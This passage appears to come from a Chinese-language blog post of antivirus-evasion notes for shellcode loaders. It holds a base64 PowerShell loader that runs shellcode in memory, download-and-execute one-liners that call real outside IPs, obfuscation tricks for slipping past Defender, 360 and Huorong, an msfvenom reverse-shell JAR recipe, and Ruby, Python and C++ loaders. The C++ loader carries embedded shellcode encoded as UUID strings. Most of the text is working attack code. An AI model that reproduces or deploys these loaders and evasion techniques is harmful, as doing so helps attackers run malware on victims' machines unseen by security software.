JQYmk3dEtzYUpQRXhPMXBOQ1hyTjI1Tlo1SWdGUFdxU1lNdmtwZ0lYdTNENEI4S2tXaTc1WlhtQ2gzVFJEZjUrY1pORTFQWEFOaTVHNUhLdW5TYTZFVXNJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM1JLVFJVWEdBTmJGUmNZQTNkUlNrZEdUVmNNRmcwVEdBTnVZbUoyR0FOdGN4TWJDaTRwSTZhV3gzU1R3Q1YxVFBVbTcyWVpDa2p0WlB3VnJHeUtvcnNWRmIybzlkRTM3Y3BXaW1WbElSNU94SXBRWGdOVGZsLzVNVHVaQkZYRnJVTlpZWWdreld1T3NMb2t2Q0JjZUJuWE13MStpVWRublFqRnpLRGhJZklyMDN4bGlGYm1Kaksrb1h6MTJGZEt3WmVubUtWeHZKV0lQQXJsLzU3S1RDVjdSQnJ2RENVUlIyM0NQK3RnNGo2eXdCRjJ1bFNmcWkwT1Z0THVIbnkwQnNXcTJHbFkyNUQ5UVdQbW94WkdZUElhSTYyeG5zVW5IVjVaTmhPb1BuS055cVA5Y2VuZVU5YlpDQVp2dzJKYzNTTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNGeEFORWhBYkRSRVVEUklSSTJxMUlmRT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$z</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$DoIt</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$z</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$z</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bb</span>=[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x</span>))</span><br><span class="line">powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> hr.ps1</span><br><span class="line"></span><br><span class="line">填充垃圾数据</span><br><span class="line">直接在base64编码上添加，然后解码前进行还原（为了让杀毒判断失效）</span><br><span class="line">直接在原型代码上添加，然后解码还原</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">项目混淆：<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">https://github.com/danielbohannon/<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">加载模块：<span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line">运行程序：<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">处理文件：<span class="built_in">set</span> scriptpath C:\Users\<span class="number">86135</span>\Desktop\<span class="number">1</span>.ps1</span><br><span class="line">处理代码：<span class="built_in">set</span> scriptblock <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">进入编码：encoding</span><br><span class="line">选择编码：<span class="number">1</span><span class="literal">-8</span></span><br><span class="line">输出文件：out C:\Users\<span class="number">86135</span>\Desktop\<span class="number">11</span>.ps1</span><br></pre></td></tr></table></figure>

<h5 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h5><p>通过将shellcode放在web端，利用加载器去下载执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span>= ((<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;http://47.94.236.117/1.txt&#x27;</span>))</span><br><span class="line">解码：</span><br><span class="line"><span class="variable">$x</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$d</span>))</span><br><span class="line"></span><br><span class="line">http://<span class="number">47.94</span>.<span class="number">236.117</span>/<span class="number">1</span>.txt  =  <span class="variable">$d</span> base64数据</span><br><span class="line"><span class="variable">$d</span>= ((<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;http://47.94.236.117/1.txt&#x27;</span>))</span><br><span class="line"><span class="variable">$x</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$d</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="PowerShell-文件模式-特征修改过DeFender（过不了火绒）"><a href="#PowerShell-文件模式-特征修改过DeFender（过不了火绒）" class="headerlink" title="PowerShell-文件模式-特征修改过DeFender（过不了火绒）"></a>PowerShell-文件模式-特征修改过DeFender（过不了火绒）</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/14380138.html">https://www.cnblogs.com/zzjdbk/p/14380138.html</a></p>
<p>Fuzz DF查杀特征</p>
<p>1、Shellcode换格式</p>
<p>2、变量名&amp;函数名全修改</p>
<p>将shellcode转换成字节形式，将变量名函数名换成自定义的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="variable">$s</span> = [<span class="built_in">Byte</span>[]]<span class="variable">$var_code</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;【cs生成的shellcode】&#x27;</span>)</span><br><span class="line"><span class="variable">$s</span> |<span class="keyword">foreach</span> &#123; <span class="variable">$string</span> = <span class="variable">$string</span> + <span class="variable">$_</span>.ToString()+<span class="string">&#x27;,&#x27;</span>&#125;</span><br><span class="line"><span class="variable">$string</span> &gt; D:\<span class="number">2</span>.txt  </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>直接命令执行上线如果被提示，可以通过以下方法</p>
<p>3、垃圾数据干扰：</p>
<p>powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString(‘ht’+’tp:&#x2F;&#x2F;43.138.27.12:8880&#x2F;2.ps1’)</p>
<p>4.通过copy powershell.exe程序 到当前文件：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">替换文件名：</span><br><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe bypass.txt</span><br><span class="line">bypass.txt <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>5.也可以将脚本命令转换为exe程序进行绕过</p>
<p>6.对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做一些处理。<br>比如利用replace替换函数，可以bypass。</p>
<p><a target="_blank" rel="noopener" href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoExit</span> <span class="string">&quot;<span class="variable">$c1</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="variable">$c2</span>=&#x27;123(&#x27;&#x27;http://10.211.55.2/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="variable">$c1</span>+<span class="variable">$c2</span>)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="汇编代码免杀绕过"><a href="#汇编代码免杀绕过" class="headerlink" title="汇编代码免杀绕过"></a>汇编代码免杀绕过</h3><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1536">https://forum.butian.net/share/1536</a></p>
<h3 id="java免杀（静态）"><a href="#java免杀（静态）" class="headerlink" title="java免杀（静态）"></a>java免杀（静态）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、JAR包源码特征修改免杀</span><br><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f jar -o msf.jar</span><br><span class="line">-Jar反编译导出-jdgui</span><br><span class="line">-修改上线配置-config</span><br><span class="line">-修改启动主类-MANIFEST.MF</span><br><span class="line">-修改执行代码-Main.java</span><br><span class="line">-打包class-javac Main.java</span><br><span class="line">-编译jar-jar cvfm xiaodi.jar META-INF/MANIFEST.MF .</span><br><span class="line"></span><br><span class="line">2、JAR包打包EXE执行免杀</span><br><span class="line">安装：exe4j Inno进行打包</span><br><span class="line">exe4j-下载链接：https://exe4j.apponic.com/</span><br><span class="line">inno-下载链接：https://jrsoftware.org/isdl.php</span><br><span class="line">操作说明：https://www.jb51.net/article/236000.htm</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Ruby免杀："><a href="#Ruby免杀：" class="headerlink" title="Ruby免杀："></a>Ruby免杀：</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/import&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/types&#x27;</span> </span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">include</span> <span class="title class_">Fiddle</span> </span><br><span class="line">kernel32 = <span class="title class_">Fiddle</span>.dlopen(<span class="string">&#x27;kernel32&#x27;</span>) </span><br><span class="line">ptr = <span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;VirtualAlloc&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, shellcode.size, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;VirtualProtect&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(ptr, shellcode.size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">buf = <span class="title class_">Fiddle</span><span class="symbol">:</span><span class="symbol">:Pointer</span>[shellcode] </span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;RtlMoveMemory&#x27;</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>],<span class="number">4</span>).call(ptr, buf, shellcode.size)</span><br><span class="line">thread = <span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;CreateThread&#x27;</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) </span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;WaitForSingleObject&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(thread, ‐<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="无文件落地（加载器分离）"><a href="#无文件落地（加载器分离）" class="headerlink" title="无文件落地（加载器分离）"></a>无文件落地（加载器分离）</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/compliance/290379.html">https://www.freebuf.com/articles/compliance/290379.html</a></p>
<h4 id="Python-File-将shellcode从文本中提取"><a href="#Python-File-将shellcode从文本中提取" class="headerlink" title="Python-File-将shellcode从文本中提取"></a>Python-File-将shellcode从文本中提取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;s.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s=f.read()</span><br></pre></td></tr></table></figure>

<h4 id="Python-Argv-将shellcode与加载器分离"><a href="#Python-Argv-将shellcode与加载器分离" class="headerlink" title="Python-Argv-将shellcode与加载器分离"></a>Python-Argv-将shellcode与加载器分离</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">核心代码：</span><br><span class="line">z=sys.argv[<span class="number">1</span>]</span><br><span class="line">zx=base64.b64decode(z)</span><br><span class="line"><span class="built_in">exec</span>(zx)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Python-Http-将shellcode用远程协议加载"><a href="#Python-Http-将shellcode用远程协议加载" class="headerlink" title="Python-Http-将shellcode用远程协议加载"></a>Python-Http-将shellcode用远程协议加载</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">all</span>=requests.get(<span class="string">&#x27;http://www.xxxx.com/all.txt&#x27;</span>).text</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Python-Socket-将shellcode通过管道传输"><a href="#Python-Socket-将shellcode通过管道传输" class="headerlink" title="Python-Socket-将shellcode通过管道传输"></a>Python-Socket-将shellcode通过管道传输</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">参考：https://www.cnblogs.com/Keep-Ambition/p/<span class="number">7459213.</span>html</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>(<span class="params">data</span>):</span><br><span class="line">    执行code</span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">9999</span>))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn,addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        zx(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Python-Images-将shellcode隐写进图片内"><a href="#Python-Images-将shellcode隐写进图片内" class="headerlink" title="Python-Images-将shellcode隐写进图片内"></a>Python-Images-将shellcode隐写进图片内</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考：https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw</span><br><span class="line">加密:RGBAencodeDataInImage(im, arguments[<span class="string">&#x27;&lt;text&gt;&#x27;</span>]).save(arguments[<span class="string">&#x27;&lt;encodedImage&gt;&#x27;</span>])</span><br><span class="line">解密：im = Image.<span class="built_in">open</span>(arguments[<span class="string">&#x27;&lt;encodedImage&gt;&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw">https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw</a></p>
<h3 id="UUID转换shellcode写入内存免杀"><a href="#UUID转换shellcode写入内存免杀" class="headerlink" title="UUID转换shellcode写入内存免杀"></a>UUID转换shellcode写入内存免杀</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12253">https://xz.aliyun.com/t/12253</a></p>
<p><a target="_blank" rel="noopener" href="https://www.crisprx.top/archives/458">https://www.crisprx.top/archives/458</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1787219">https://cloud.tencent.com/developer/article/1787219</a></p>
<h4 id="c-uuid加载器"><a href="#c-uuid加载器" class="headerlink" title="c++ uuid加载器"></a>c++ uuid加载器</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* uuids[] = &#123; <span class="string">&quot;0089e8fc-0000-8960-e531-d2648b52308b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c7e2f05257&quot;</span>,<span class="string">&quot;8b10528b-3c42-d001-8b40-7885c0744a01&quot;</span>,<span class="string">&quot;488b50d0-8b18-2058-01d3-e33c498b348b&quot;</span>,<span class="string">&quot;ff31d601-c031-c1ac-cf0d-01c738e075f4&quot;</span>,<span class="string">&quot;3bf87d03-247d-e275-588b-582401d3668b&quot;</span>,<span class="string">&quot;588b4b0c-011c-8bd3-048b-01d089442424&quot;</span>,<span class="string">&quot;59615b5b-515a-e0ff-585f-5a8b12eb865d&quot;</span>,<span class="string">&quot;74656e68-6800-6977-6e69-54684c772607&quot;</span>,<span class="string">&quot;ff31d5ff-5757-5757-5768-3a5679a7ffd5&quot;</span>,<span class="string">&quot;000084e9-5b00-c931-5151-6a0351516850&quot;</span>,<span class="string">&quot;53000000-6850-8957-9fc6-ffd5eb705b31&quot;</span>,<span class="string">&quot;006852d2-4002-5284-5252-53525068eb55&quot;</span>,<span class="string">&quot;d5ff3b2e-c689-c383-5031-ff57576aff53&quot;</span>,<span class="string">&quot;062d6856-7b18-d5ff-85c0-0f84c3010000&quot;</span>,<span class="string">&quot;f685ff31-0474-f989-eb09-68aac5e25dff&quot;</span>,<span class="string">&quot;68c189d5-2145-315e-ffd5-31ff576a0751&quot;</span>,<span class="string">&quot;b7685056-e057-ff0b-d5bf-002f000039c7&quot;</span>,<span class="string">&quot;ff31b774-91e9-0001-00e9-c9010000e88b&quot;</span>,<span class="string">&quot;2fffffff-6b31-566a-00fe-dc7a2d31c9e7&quot;</span>,<span class="string">&quot;42b51e28-625f-f5a3-6442-792da2d8f774&quot;</span>,<span class="string">&quot;c764c1ca-fec2-b232-360a-a0904efad447&quot;</span>,<span class="string">&quot;d98ba404-65e6-8fa1-bee4-b69563f0b446&quot;</span>,<span class="string">&quot;60f88520-b15e-a0f8-59ef-9eb2c6e6f95d&quot;</span>,<span class="string">&quot;5500078e-6573-2d72-4167-656e743a204d&quot;</span>,<span class="string">&quot;6c697a6f-616c-352f-2e30-2028636f6d70&quot;</span>,<span class="string">&quot;62697461-656c-203b-4d53-49452031302e&quot;</span>,<span class="string">&quot;57203b30-6e69-6f64-7773-204e5420362e&quot;</span>,<span class="string">&quot;57203b32-574f-3436-3b20-54726964656e&quot;</span>,<span class="string">&quot;2e362f74-3b30-5420-6f75-63683b204d41&quot;</span>,<span class="string">&quot;534a5053-0d29-000a-91a8-10b7da807fab&quot;</span>,<span class="string">&quot;2f1623c7-614b-ebbd-a514-6f904bdf5a58&quot;</span>,<span class="string">&quot;1f5557e0-6adb-7456-c2a1-9c9f32da910d&quot;</span>,<span class="string">&quot;952d1001-8eef-7249-3a2b-9e598e85a6ad&quot;</span>,<span class="string">&quot;98c69cb6-7d10-1f09-60a3-4aeabe4af549&quot;</span>,<span class="string">&quot;d618c78a-2260-1751-b8d6-61d38a81373e&quot;</span>,<span class="string">&quot;3d1c3d6a-f3c5-57a0-0204-4457c1142371&quot;</span>,<span class="string">&quot;6c8708c2-6b94-c189-d92b-cc6b62253fbb&quot;</span>,<span class="string">&quot;f102569f-4d54-914d-4e89-5bda5ff092a5&quot;</span>,<span class="string">&quot;cfafb2ac-e2bb-b0af-ca5b-08834c927ab5&quot;</span>,<span class="string">&quot;07d2b997-8fc9-80b7-fc26-3da3d19e2942&quot;</span>,<span class="string">&quot;780bcd05-11c2-4f86-6657-dae24b98cc46&quot;</span>,<span class="string">&quot;febde54d-2cc7-d3c4-e5c0-f943cad41d5a&quot;</span>,<span class="string">&quot;6800da73-b5f0-56a2-ffd5-6a4068001000&quot;</span>,<span class="string">&quot;00006800-0040-6857-58a4-53e5ffd593b9&quot;</span>,<span class="string">&quot;00000000-d901-5351-89e7-576800200000&quot;</span>,<span class="string">&quot;12685653-8996-ffe2-d585-c074c68b0701&quot;</span>,<span class="string">&quot;75c085c3-58e5-e8c3-a9fd-ffff31302e31&quot;</span>,<span class="string">&quot;32342e39-312e-3434-0012-345678000000&quot;</span> &#125;; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE hc = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//获得可执行的句柄</span></span><br><span class="line">  <span class="type">void</span>* ha = <span class="built_in">HeapAlloc</span>(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//申请堆空间</span></span><br><span class="line">  <span class="keyword">if</span> (ha == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;内存申请失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">  <span class="type">int</span> elems = <span class="built_in">sizeof</span>(uuids) / <span class="built_in">sizeof</span>(uuids[<span class="number">0</span>]);<span class="comment">//获得需要写入uuids数组元素个数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; elems; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; (RPC_CSTR)uuids[i] &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; (UUID*)hptr &lt;&lt; endl;</span></span><br><span class="line">    RPC_STATUS status = <span class="built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//写入shellcode</span></span><br><span class="line">      <span class="keyword">if</span> (status != RPC_S_OK)<span class="comment">//判断是否写入正常</span></span><br><span class="line">      &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;UuidFromeStringA()!=S_OK&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(ha);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    hptr += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//((void(*)())ha)();</span></span><br><span class="line">  <span class="built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//回调函数,运行shellcode</span></span><br><span class="line">  <span class="built_in">CloseHandle</span>(ha);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

